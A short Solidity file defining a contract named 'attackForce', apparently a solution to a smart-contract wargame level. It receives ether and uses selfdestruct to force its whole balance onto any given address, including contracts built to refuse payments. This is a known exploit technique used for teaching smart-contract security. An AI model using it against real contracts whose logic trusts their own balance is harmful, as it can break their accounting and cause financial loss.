// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract attackForce {
    
    receive() external payable {
    }

    function payEverythingToForce(address payable _address) public {
        selfdestruct(_address);
    }

}